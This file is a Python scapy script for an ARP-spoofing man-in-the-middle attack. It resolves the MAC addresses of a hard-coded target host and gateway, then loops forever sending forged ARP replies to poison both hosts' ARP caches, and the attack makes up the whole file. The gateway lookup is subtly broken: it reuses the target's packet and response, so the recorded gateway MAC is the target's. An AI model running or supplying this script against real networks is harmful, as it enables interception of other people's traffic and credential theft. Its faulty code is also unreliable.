from scapy.all import *

print("")
print("SENDING PACKET TO GET MAC ADDRESS")

###### TARGET STARTS HERE ##########
target_ip = '192.168.75.87'

arprequest = ARP(pdst=target_ip)
broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')

final_packet = broadcast / arprequest

response = srp(final_packet, timeout=2, verbose=True)[0]

print("")
print(f'THE MAC ADDRESS OF {target_ip}')
mac_target_ip = response[0][1].hwsrc
print(mac_target_ip)

######### TARGET ENDS HERE ##########

########## GATEWAY STARTS HERE ###########

gateway_ip = '192.168.75.182'

gateway_arprequest = ARP(pdst=gateway_ip)
broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')

gateway_final_packet = broadcast / gateway_arprequest

gateway_response = srp(final_packet, timeout=2, verbose=True)[0]

print("")
print(f'THE MAC ADDRESS OF {gateway_ip} (gateway)')
gateway_mac = response[0][1].hwsrc
print(gateway_mac)



######### GATEWAY ENDS HERE ###########

      
print("")
print(f"SENDING NEW IP TO {gateway_ip} TO START SPOOFING")

      
while True:
    new_packet = ARP(op=2,pdst=target_ip, hwdst=mac_target_ip, psrc=gateway_ip) 
    send(new_packet, verbose=False)
    new_packet = ARP(op=2,pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip) 
    send(new_packet, verbose=False)


